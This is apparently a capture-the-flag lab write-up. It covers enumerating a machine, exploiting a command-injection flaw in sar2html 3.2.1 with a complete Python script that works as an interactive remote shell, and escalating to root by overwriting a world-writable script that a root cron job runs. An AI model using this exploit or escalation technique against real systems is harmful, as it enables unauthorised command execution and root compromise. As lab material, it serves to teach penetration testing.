This was a fairly easy machine, I began with a `nmap` scan:

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

On port 80 there was a blank website, so I fuzz it and found bunch of files.

```
http://192.168.210.35/robots.txt -> http://192.168.210.35/sar2HTML/
http://192.168.210.35/phpinfo.php
```

Using the `phpinfo` I have enumerated the versions

```bash
sar2html Ver 3.2.1 <-- Vulnerable
Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64
Apache/2.4.29
PHP 7.1.32-1+ubuntu18.04.1+deb.sury.org+1
exif 7.1.32-1+ubuntu18.04.1+deb.sury.org+1 - JPEG,TIFF
mysqlnd 5.0.12-dev - 20150407
Net_SFTP_Stream 0.3.2 SFTP Stream Wrapper
```

`sar2html` Was vulnerable to RCE, and I've created a python script to exploit it further.

```python
import bs4
import requests


url = "http://<ip>/sar2HTML/index.php?plot=;"

while True:
    command = input("$ ")
    if command == "exit":
        break
    else:
        response = requests.get(url + command.replace(" ", "%20"))
        html = response.text
        soup = bs4.BeautifulSoup(html, "html.parser")

        sel_tag = soup.find("select", {"class": "select_text"}).children
        for c in sel_tag:
            if c.text == "Select Host":
                continue
            if c.text == "There is no defined host...":
                continue
            print(c.text)
```

Using this script, you can read the `user/local.txt` file to get the first flag. 

I then run the `linpeas` script to check how to privilege escalation, I've noticed that there was a `cron` job that was running on the `*.sh` files in the `/var/www/html` folder:

```bash
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

`finally.sh` is actually calling `write.sh` which is writable by the `www-data`

```
-rwxrwxrwx 1 www-data www-data    55 Mar  5 15:32 write.sh
```

I've used the following script to get the `root` `proof.txt`

```bash
# write.sh
cat /root/proof.txt > /var/www/html/hash.txt
```

Then I waited `5m` to get the flag, I've done it this way since I got problems setting up the reverse shell, nonetheless I got root.
